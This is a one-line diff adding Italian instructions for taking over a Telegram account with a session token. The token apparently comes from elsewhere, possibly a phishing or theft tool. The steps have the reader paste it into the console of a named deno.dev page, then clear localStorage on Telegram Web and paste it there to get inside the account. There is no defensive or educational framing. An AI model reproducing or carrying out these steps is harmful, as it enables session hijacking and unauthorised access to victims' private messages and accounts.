@@ -1,0 +1,1 @@
+Arriva il token, lo copi, vai su "https://mazzamassy-complete-91.deno.dev/" --> F12 --> console --> incolli il token (sei nell'account), Vai su una scheda chrome, apri telegram web --> F12 --> application --> localstorage --> clear --> console --> incolli il token (sei dentro).
